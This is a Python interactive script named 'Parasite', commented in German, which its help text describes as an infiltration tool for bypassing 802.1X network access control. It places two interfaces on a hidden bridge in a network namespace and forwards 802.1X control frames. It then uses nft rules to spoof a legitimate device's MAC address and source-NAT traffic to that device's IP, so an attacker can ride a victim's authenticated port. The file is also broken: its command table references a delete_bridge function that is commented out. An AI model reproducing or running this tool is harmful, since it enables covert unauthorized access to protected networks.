from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import HTML
from rich import print
import subprocess
import os
import shlex

def rs(command):
	output =" ".join(command.args)
	if command.returncode != 0:
		print(f"[red]{output} => {command.returncode}:{command.stderr}[/red]")
	print(f"[green]{output}[/green]")
	return

def list_help():
	print("[red]Parasite Help Menue[/red]")
	print("[cyan]Parasite ist ein infiltratinstool um 802.1X zu umgehen[/cyan]")
	return
def list_interfaces():
	output = subprocess.run(["ls","/sys/class/net"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
	interface = output.stdout.strip().split("\n")
	print(f"[green]{interface}[/green]")
	return 

def list_namespaces():
	output = subprocess.run(["ip","netns","list"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
	interface = output.stdout.strip().split("\n")
	print(f"[green]{interface}[/green]")
	return

def list_namespace_interfaces(name):
	output = subprocess.run(["sudo","ip","netns","exec",name,"ip","a"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
	interface = output.stdout.strip().split("\n")
	print(f"[green]{interface}[/green]")
	return

def create_bridge(int_0,int_1):
#Namespace erstellen => ip netns add parasite
	rs(subprocess.run(["sudo","ip","netns","add","parasite"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#bridge erstellen => ip link add br0 type bridge
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","add","br0","type","bridge"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#bridge runterfahren => ip link set br0 down
#interfaces aus Networkmanager entfernen => nmcli device set ..interface.. managed no
	rs(subprocess.run(["sudo","nmcli","device","set","br0","managed","no"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","nmcli","device","set",int_0,"managed","no"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","nmcli","device","set",int_1,"managed","no"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#Bridge in Namespace verschieben => ip link set br0 netns parasite
#Interfaces in Namespace verschieben => ip link set ..interface.. netns parasite
	rs(subprocess.run(["sudo","ip","link","set",int_0,"netns","parasite"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","link","set",int_1,"netns","parasite"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#Interface an Bridge hinzufügen => ip netns exec parasite ip link seth ..interface.. master br0
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set",int_0,"master","br0"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set",int_1,"master","br0"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#Interfaces hochfahren => ip netns exec parasite ip link set ..interface.. up
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set","lo","up"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set","br0","up"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set",int_0,"up"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set",int_1,"up"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	

#ip6 abdrehen
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","sysctl","-w","net.ipv6.conf.all.disable_ipv6=1"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","sysctl","-w","net.ipv6.conf.default.disable_ipv6=1"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))

#Packete durchschleifen für Muldicast-Control-Fraes (ursprünglich 65528
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","link","set","br0","type","bridge","group_fwd_mask","65528"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	return

def create_parasite(int_0, int_1,mac,ip_l,ip_p):
	cidr = f"{ip_l}/24"
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","addr","add",cidr,"dev","br0"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#Default Route auf br0 setzten => sudo ip netns exec parasite ip route replace default via 192.168.8.1 dev br0
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","ip","route","replace","default","via",ip_l,"dev","br0"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))

#Kontrolle ob nft tables gelöscht sind => sudo ip netns exec parasite nft delete table bridge br_l2
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","delete","table","bridge","br_l2"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#Kontrolle ob nft table nat gelöscht sind => sudo ip netns exec parasite nft delete table bridge nat_l3
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","delete","table","bridge","nat_l3"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#MAC Filter anlegen
#sudo ip netns exec parasite nft add table bridge br_l2
#sudo ip netns exec parasite nft add chain bridge br_l2 output '{ type filter hook output priority 300; policy accept; }'
#sudo ip netns exec parasite nft add rule bridge br_l2 output 'oifname { "eth1", "eth2" } counter ether saddr set 00:24:81:eb:cf:ec'
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","table","bridge","br_l2"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","chain","bridge","br_l2","output","{ type filter hook output priority 300; policy accept; }"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rule = f'oifname {{ "{int_0}", "{int_1}" }} counter ether saddr set {mac}'
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","rule","bridge","br_l2","output",rule],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#nft add rule bridge br_l2 postrouting oifname "br0" ether type arp ether saddr set 02:aa:bb:cc:dd:ee

#NAT anlegen
	#sudo ip netns exec parasite nft add table inet nat_l3
	#sudo ip netns exec parasite nft add chain inet nat_l3 postrouting '{ type nat hook postrouting priority 100; policy accept; }'
	#sudo ip netns exec parasite nft add rule inet nat_l3 postrouting oifname "br0" ip saddr 192.168.8.55 snat to 192.168.8.153

#---------------
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","table","inet","nat_l3"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","chain","inet","nat_l3","postrouting","{ type nat hook postrouting priority 100; policy accept; }"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","rule","inet","nat_l3","postrouting","oifname","\"br0\"","ip","saddr",ip_l,"snat","to",ip_p],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
	#rs(subprocess.run(["sudo","ip","netns","exec","parasite","nft","add","rule","inet","nat_l3","postrouting","oifname","\"br0\"","ip","saddr","0.0.0.0/0","snat","to",ip_p],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))

	return

#def delete_bridge(bridge):
#	rs(subprocess.run(["sudo","ip","link","set",bridge,"down"],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#	rs(subprocess.run(["sudo","ip","link","delete",bridge],stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True))
#	return



commands={
	"list_help": list_help,
	"lh": list_help,
	"list_interfaces": list_interfaces,
	"li": list_interfaces,
	"list_namespaces": list_namespaces,
	"ln": list_namespaces,
	"create_bridge": create_bridge,
	"cb": create_bridge,
	"delete_bridge": delete_bridge,
	"db": delete_bridge,
	"list_namespace_interfaces": list_namespace_interfaces,
	"lni": list_namespace_interfaces,
	"create_parasite": create_parasite,
	"cp": create_parasite,
}


while True:
	cli = prompt(">>")
	input = shlex.split(cli)
	command = input[0]
	args = input[1:]

	if command == "exit":
		break
	if command in commands:
		commands[command](*args)
	else:
		print(f"Befehl: {command} not found")

